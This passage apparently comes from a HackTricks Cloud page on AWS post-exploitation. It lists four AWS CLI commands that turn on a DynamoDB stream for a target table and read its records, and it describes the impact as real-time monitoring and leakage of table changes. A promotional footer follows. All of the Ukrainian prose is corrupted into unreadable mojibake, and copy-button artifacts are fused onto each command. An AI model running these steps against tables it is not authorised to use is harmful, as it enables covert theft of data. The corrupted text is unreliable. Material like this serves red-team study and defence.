–¥–∞–Ω—ñ –ø—Ä–æ –∑–º—ñ–Ω–∏, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤–∏—Ç–æ–∫—É –¥–∞–Ω–∏—Ö.

1. –£–≤—ñ–º–∫–Ω—É—Ç–∏ –ø–æ—Ç—ñ–∫ –Ω–∞ —Ç–∞–±–ª–∏—Ü—ñ DynamoDB:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. –û–ø–∏—à—ñ—Ç—å –ø–æ—Ç—ñ–∫ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è ARN —Ç–∞ —ñ–Ω—à–∏—Ö –¥–µ—Ç–∞–ª–µ–π:
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ—Ç–µ—Ä–∞—Ç–æ—Ä —à–∞—Ä–¥—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ ARN –ø–æ—Ç–æ–∫—É:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —ñ—Ç–µ—Ä–∞—Ç–æ—Ä —à–∞—Ä–¥—ñ–≤ –¥–ª—è –¥–æ—Å—Ç—É–ø—É —Ç–∞ –≤–∏–≤–µ–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –∑ –ø–æ—Ç–æ–∫—É:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ —Ç–∞ –≤–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –∑–º—ñ–Ω —É —Ç–∞–±–ª–∏—Ü—ñ DynamoDB.

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π –º–µ—Ä—á PEASS & HackTricks**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
